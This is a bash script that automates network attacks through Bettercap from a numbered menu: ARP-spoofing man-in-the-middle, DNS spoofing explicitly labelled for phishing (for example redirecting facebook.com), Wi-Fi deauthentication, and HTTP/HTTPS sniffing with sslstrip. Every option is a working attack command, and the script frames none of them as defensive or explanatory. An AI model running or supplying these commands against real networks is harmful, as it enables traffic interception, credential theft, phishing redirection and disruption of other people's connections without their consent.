#!/bin/bash

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "\e[1;31m[!] This script must be run as root. Use 'sudo ./bettercap_automator.sh'\e[0m"
    exit 1
fi

# Banner
echo -e "\e[1;34m"
echo "   ____      _   __      __   __________"
echo "  / __ )____/ | / /___  / /_ / ____/ __ \ "
echo " / __  / __ \  |/ / __ \/ __// /   / /_/ /"
echo "/ /_/ / /_/ / /| / /_/ / /__/ /___/ ____/ "
echo "\____/\____/_/ |_\____/\___/\____/_/     "
echo -e "\e[0m"

# Check if Bettercap is installed
if ! command -v bettercap &> /dev/null; then
    echo -e "\e[1;31m[!] Bettercap not found. Installing...\e[0m"
    sudo apt update && sudo apt install -y bettercap
fi

# Menu
echo -e "\e[1;36m"
echo "1) ARP Spoofing (MITM)"
echo "2) DNS Spoofing (Phishing)"
echo "3) Wi-Fi Deauth Attack"
echo "4) HTTP/HTTPS Traffic Sniffing"
echo "5) Start Bettercap Web UI"
echo "6) Exit"
echo -e "\e[0m"

read -p "Select an attack (1-6): " choice

case $choice in
    1)
        # ARP Spoofing (MITM)
        read -p "Enter target IP (e.g., 192.168.1.100): " target
        read -p "Enter network interface (e.g., eth0/wlan0): " iface
        echo -e "\e[1;32m[*] Starting ARP Spoofing on $target...\e[0m"
        bettercap -iface $iface -eval "net.probe on; net.recon on; set arp.spoof.targets $target; arp.spoof on; net.sniff on"
        ;;
    2)
        # DNS Spoofing
        read -p "Enter domain to spoof (e.g., facebook.com): " domain
        read -p "Enter fake IP (e.g., 192.168.1.2): " fake_ip
        read -p "Enter network interface (e.g., eth0/wlan0): " iface
        echo -e "\e[1;32m[*] Spoofing $domain to $fake_ip...\e[0m"
        bettercap -iface $iface -eval "set dns.spoof.domains $domain; set dns.spoof.address $fake_ip; dns.spoof on"
        ;;
    3)
        # Wi-Fi Deauth Attack
        read -p "Enter Wi-Fi interface (e.g., wlan0): " iface
        read -p "Enter target BSSID (MAC of AP): " bssid
        echo -e "\e[1;32m[*] Sending deauth packets to $bssid...\e[0m"
        bettercap -iface $iface -eval "wifi.recon on; set wifi.deauth.target $bssid; wifi.deauth on"
        ;;
    4)
        # HTTP/HTTPS Sniffing
        read -p "Enter network interface (e.g., eth0/wlan0): " iface
        echo -e "\e[1;32m[*] Sniffing HTTP/HTTPS traffic...\e[0m"
        bettercap -iface $iface -eval "set http.proxy.sslstrip true; http.proxy on; net.sniff on"
        ;;
    5)
        # Web UI
        read -p "Enter network interface (e.g., eth0/wlan0): " iface
        echo -e "\e[1;32m[*] Starting Web UI on http://<YOUR_IP>:8080\e[0m"
        bettercap -iface $iface -caplet http-ui
        ;;
    6)
        echo -e "\e[1;33m[+] Exiting...\e[0m"
        exit 0
        ;;
    *)
        echo -e "\e[1;31m[!] Invalid option. Exiting.\e[0m"
        exit 1
        ;;
esac
